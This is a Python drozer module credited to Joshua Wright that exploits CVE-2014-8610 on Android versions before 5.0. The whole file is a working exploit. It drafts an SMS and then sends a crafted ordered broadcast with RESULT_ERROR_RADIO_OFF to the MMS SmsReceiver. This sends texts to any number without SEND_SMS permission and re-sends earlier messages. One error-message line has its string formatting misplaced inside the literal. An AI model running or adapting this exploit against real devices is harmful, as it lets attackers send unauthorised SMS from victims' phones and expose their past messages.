from drozer import android
from drozer.modules import Module
from time import sleep
from pydiesel.reflection.types.reflected_null import ReflectedNull
#from IPython import embed


class smsdraftsend(Module):
	name = "Exploit CVE-2014-8610 Android < 5.0 SMS resend vulnerability (Baidu X-Team)"
	description = "Exploit for CVE-2014-8610 that allows for an SMS message send to any recipient without SEND_SMS permission while re-sending all prior SMS messages"
	examples = """
dz> run exploit.badauth.smsdraftsend  -m "I <3 Drozer" -t 4015551212
[+] Drafting SMS message to send.
[+] Calling app to send message to drafts.
[+] Sending draft messages.
[+] Message sent.
"""
	author = "Joshua Wright/@joswr1ght"
	date = "2014-11-29"
	license = "BSD (3-clause)"
	path = ["exploit", "badauth"]
	permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

	RESULT_ERROR_RADIO_OFF=2

	def add_arguments(self, parser):
		parser.add_argument("-m", "--message",  default=None, help="specify the SMS message to send")
		parser.add_argument("-t", "--telephone", default=None, help="specify the recipient phone number")
		parser.add_argument("-c", "--component", nargs=2, default=["com.android.browser", "com.android.browser.BrowserActivity"], help="Package and Component of any other Activity to temporarily launch (default: com.android.browser com.android.browser.BrowserActivity)")


	def draftsms(self, arguments):
		act = "android.intent.action.SENDTO"
		cat = None
		comp = None
		data = "smsto:" + arguments.telephone
		extr = [['string', 'sms_body', arguments.message]]
		flgs = ['ACTIVITY_NEW_TASK']

		#build the intent
		intent = android.Intent(action=act, category=cat, data_uri=data, component=comp, extras=extr, flags=flgs)
		if intent.isValid():
			self.getContext().startActivity(intent.buildIn(self))
		else:
			self.stderr.write("[-] Invalid!\n")


	def smsordered(self, arguments, initialcode):
		# This is the vulnerability - setting RESULT_ERROR_RADIO_OFF causes message to be requeued
		act = "com.android.mms.transaction.MESSAGE_SENT"
		cat = None
		comp = ("com.android.mms", "com.android.mms.transaction.SmsReceiver")
		data = "content://sms"
		extr = None
		flgs = None

		#build the intent
		intent = android.Intent(action=act, category=cat, data_uri=data, component=comp, extras=extr, flags=flgs)
		if intent.isValid():
			self.getContext().sendOrderedBroadcast(intent.buildIn(self), None, None, None, initialcode, None, None)
		else:
			self.stderr.write("[-] Invalid Intent!\n")


	def execute(self, arguments):
		if arguments.message == None or arguments.telephone == None:
			self.stderr.write("Must specify a message with \"-m\" and a recipient with \"-t\"\n")
			return 

		if (len(arguments.component) != 2):
			self.stderr.write("[-] Invalid package and component: %s %s%(arguments.component[0],arguments.component[1]\n")
			return


		self.stdout.write("[+] Drafting SMS message to send.\n")
		#sleep(2)
		self.draftsms(arguments)

		self.stdout.write("[+] Calling app to send message to drafts.\n")
		#sleep(2)
		intent = android.Intent(component=(arguments.component[0], arguments.component[1]), flags=['ACTIVITY_NEW_TASK'])
		if intent.isValid():
			self.getContext().startActivity(intent.buildIn(self))
		else:
			self.stderr.write("[-] Invalid App Activity Intent!\n")

		sleep(2)

		self.stdout.write("[+] Sending draft messages.\n")
		self.smsordered(arguments, self.RESULT_ERROR_RADIO_OFF)

		self.stdout.write("[+] Message sent.\n")
